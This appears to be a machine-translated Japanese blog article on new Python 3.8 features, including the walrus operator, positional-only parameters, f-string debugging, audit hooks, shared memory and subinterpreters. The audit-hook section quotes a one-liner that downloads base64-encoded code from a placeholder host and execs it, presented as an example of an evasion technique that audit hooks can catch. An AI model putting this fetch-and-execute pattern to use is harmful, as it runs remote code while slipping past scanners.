Python 3.8：新機能とその使用方法

次の翻訳は、Python 3.8の新機能について確実に読みたいと思っているPythonistのために特別に用意されています。コース「Python開発者」での新しいスレッドの開始を見越して、このトピックを乗り越えることができませんでした。

この記事では、Python 3.8で導入された新機能について説明します。



セイウチ演算子（代入演算子）


私たちはあなたがこれを待っていたことを知っています。この期待は、Pythonが比較演算子として「=」を使用することを意図的に禁止されていた時代にさかのぼります。割り当てと比較で=と==を混同しなくなったため、これを好む人もいました。他の人は、演算子を繰り返すか、それを変数に割り当てるのが不快だと感じました。例に移りましょう。

Guidoによれば、ほとんどのプログラマーは次のように書く傾向があります。

group = re.match(data).group(1) if re.match(data) else None

代わりに

match = re.match(data)
group = match.group(1) if match else None

これにより、プログラムの実行が遅くなります。一部のプログラマがまだ最初の方法で記述しない理由は理解できますが、コードが雑然としています。

今、私たちはそうする機会があります：

group = match.group(1) if (match := re.match(data)) else None

また、事前にすべてを計算しないようにするため、ifsを使用する場合にも役立ちます。

match1 = pattern1.match(data)
match2 = pattern2.match(data)
if match1:
    result = match1.group(1)
elif match2:
    result = match2.group(2)
else:
    result = None

そして代わりに、私たちは書くことができます：

if (match1 := pattern1.match(data)):
    result = match1.group(1)
elif (match2 := pattern2.match(data)):
    result = match2.group(2)
else:
    result = None

2番目のifは、1番目のifが機能する場合は考慮されないため、どちらがより最適です。

実際、PEP-572標準には非常に満足しています。これは、以前は存在しなかった機会を提供するだけでなく、このために別の演算子を使用するため、==と混同することは容易ではないからです。

ただし、同時に、エラーや以前は機能していなかったコードが作成される可能性もあります。

y0 = (y1 := f(x))

位置引数


def f(a, b, /, c, d, *, e, f):
    print(a, b, c, d, e, f)

ここでは、前にあるの/は厳密に位置引数であり、後にあるの*は単なるキーワードです。

f(10, 20, 30, d=40, e=50, f=60)     - valid
f(10, b=20, c=30, d=40, e=50, f=60) - b cannot be a keyword argument
f(10, 20, 30, 40, 50, f=60)         - e must be a keyword argument

この機能の範囲は、1つの文で表すことができます。ライブラリの署名を変更する方が簡単です。例を見てみましょう：

def add_to_queue(item: QueueItem):

これで作成者はこのような署名をサポートし、パラメーター名は変更されなくなります。この変更が重要になるためです。1つの要素だけでなく、要素のリスト全体を変更する必要があるとします。

def add_to_queue(items: Union[QueueItem, List[QueueItem]]):

とか、ぐらい：

def add_to_queue(*items: QueueItem):

これは、以前のバージョンとの互換性がない可能性があるため、以前はできなかったことです。今することができます。さらに、これはすでにこのアプローチを使用している設計との整合性が高くなります。たとえば、kwargsをpow関数に渡すことはできません。

>>> help(pow)
...
pow(x, y, z=None, /)
...
>>> pow(x=5, y=3)
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
TypeError: pow() takes no keyword arguments

f-lineを使用したデバッグ


「変数名=」変数の形式のコンパクトな記録形式の使用に役立つ小さな追加関数。

f"{chr(65) = }" => "chr(65) = 'A'"

chr（65）の後でこれに気付きましたか？同じトリック。f-lineを使用して変数を出力する短い方法を提供するのに役立ちます。

Pythonがランタイム監査フックを呼び出す


Python RanimeはCに大きく依存しています。ただし、Python Ranimeで実行されるコードは、ログに記録されず、追跡もされません。これにより、テスト用のフレームワーク、ロギング用のフレームワーク、セキュリティツールの動作を監視することが難しくなり、ランタイムによって実行されるアクションが制限される可能性があります。

これで、モジュールインポートシステムの操作やユーザーフックなど、ランタイムによってトリガーされるイベントを確認できます。

新しいAPIは次のとおりです。

# Add an auditing hook
sys.addaudithook(hook: Callable[[str, tuple]])
# Raise an event with all auditing hooks
sys.audit(str, *args)

フックは削除または置換できません。CPythonの場合、Cからのフックはグローバルと見なされますが、Pythonからのフックは現在のインタープリター専用です。グローバルフックは、インタープリターフックの前に実行されます。

特に興味深い、追跡されていないエクスプロイトの1つは、次のようになります。

python -c “import urllib.request, base64;
    exec(base64.b64decode(
        urllib.request.urlopen(‘http://my-exploit/py.b64')
    ).decode())”

このコードは、ほとんどのウイルス対策プログラムではスキャンされません。ディスクへの読み込みと書き込み時に読み取られる認識可能なコードに焦点を当てているため、このシステムを回避するにはbase64で十分です。このコードは、ファイルアクセス制御リストまたはアクセス許可（ファイルアクセスが必要ない場合）、信頼できるアプリケーションリスト（Pythonに必要なすべてのアクセス許可があると想定）、自動監査またはログ記録（ただし、 Pythonはインターネットにアクセスするか、ペイロードを取得できるローカルネットワーク上の別のマシンにアクセスできます。

ランタイムイベントフックを使用すると、特定のイベントに応答する方法を決定できます。イベントを登録するか、操作を完全に終了することができます。

multiprocessing.shared_memory


異なるプロセス/インタープリターから同じメモリー領域を使用するのに役立ちます。基本的に、これはオブジェクトをシリアル化してプロセス間でオブジェクトを転送するのにかかる時間を短縮するのに役立ちます。シリアライズ、キューイング、およびデシリアライズする代わりに、別のプロセスの共有メモリを使用できます。

ピクルプロトコルと帯域外データバッファー


pickle 5プロトコルは帯域外バッファのサポートを提供し、トランスポート層の裁量でデータをメインのpickleストリームとは別に送信できます。

以前の2つのアドオンは非常に重要ですが、古いコードとの互換性を維持するための作業がまだあるため、Python 3.8のリリースバージョンには含まれていませんが、これにより、Pythonでの並列プログラミングのアプローチが変わる可能性があります。

サブ通訳


Pythonのスレッドは、GILが原因で並列に実行できませんが、プロセスは多くのリソースを必要とします。プロセスの開始のみが100〜200ミリ秒かかり、大量のRAMも消費します。しかし、何かがそれらに対処することができます、そしてこれらはサブ通訳です。 GILはインタープリターであるため、他のインタープリターの作業には影響せず、プロセスよりも簡単に開始できます（ただし、スレッドよりも低速です）。

この点で発生する主な問題は、ストリームのように状態を転送できないため、インタープリター間のデータの転送です。したがって、それらの間で何らかの接続を使用する必要があります。 Pickle、marshal、またはjsonを使用してオブジェクトをシリアライズおよびデシリアライズできますが、この方法は非常にゆっくりと機能します。 1つの解決策は、プロセスモジュールの共有メモリを使用することです。

サブプロセスはGILの問題に対する適切な解決策のようですが、特定の作業プールを実行する必要があります。場合によっては、Pythonは引き続き「インタープリター状態」ではなく「ランタイム状態」を使用します。たとえば、ガベージコレクターはまさにそれを行います。したがって、通常の方法でサブインタープリターの使用を開始するには、多くの内部モジュールに変更を加える必要があります。

この機能がPythonバージョン3.9で完全にデプロイできることを願っています。

結論として、このバージョンには特定の構文糖が追加されただけでなく、ライブラリの作業と実行プロセスが大幅に改善されたと言っておきたいと思います。ただし、多くの興味深い機能がリリースに含まれていなかったため、Python 3.9でそれらを待ちます。
